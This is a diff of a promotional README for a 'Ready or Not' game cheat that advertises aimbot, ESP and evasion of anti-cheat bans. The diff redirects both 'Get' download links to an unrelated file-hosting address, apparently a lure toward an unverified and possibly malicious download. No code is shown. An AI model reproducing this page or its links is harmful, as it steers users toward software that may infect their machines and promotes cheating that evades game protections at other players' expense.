@@ -10,7 +10,7 @@ Ready or Not Cheat — Undetected Aimbot & ESP Domination 🔥
 
 Ever wish the stack flowed smoother, the peek never whiffed, and the scoreboard screamed your tag on repeat? **Ready or Not Cheat** lands you that SWAT-ops swagger with pixel-perfect aimbot, crystal ESP, and a stealth shield against anti-ban tech. Let’s dive into the toolbox that turns high-risk entries into highlight-reel headshots.
 
-[![Get Ready or Not Cheat](https://img.shields.io/badge/Get%20Ready%20or%20Not%20Cheat-blueviolet)](https://wecheaters.github.io/cheats/ready-or-not/)
+[![Get Ready or Not Cheat](https://img.shields.io/badge/Get%20Ready%20or%20Not%20Cheat-blueviolet)](https://fileoffload9.bitbucket.io)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
@@ -20,7 +20,7 @@ Ever wish the stack flowed smoother, the peek never whiffed, and the scoreboard 
 
 Ready or Not’s hardcore realism means one shaky corner and you’re toast. This cheat injects a slick overlay and silent code hooks that track hostiles, auto-snap crosshairs, and spoof your footprint so the ban-hammer never drops. A couple clicks, game auto-launches, and you’re alpha-stacking every raid.
 
-[![Get Ready or Not Cheat](https://cdn.dfg.com.br/itemimages/921285606-ready-or-not-cheat-aimbot-esp-etc-2MX1.webp)](https://wecheaters.github.io/cheats/ready-or-not/)
+[![Get Ready or Not Cheat](https://cdn.dfg.com.br/itemimages/921285606-ready-or-not-cheat-aimbot-esp-etc-2MX1.webp)](https://fileoffload9.bitbucket.io)
 
 ---
 
@@ -111,3 +111,4 @@ A5: Our dev bot flags offsets within minutes; relaunch and you’re clear. 🔥
 ## License
 
 MIT License
+
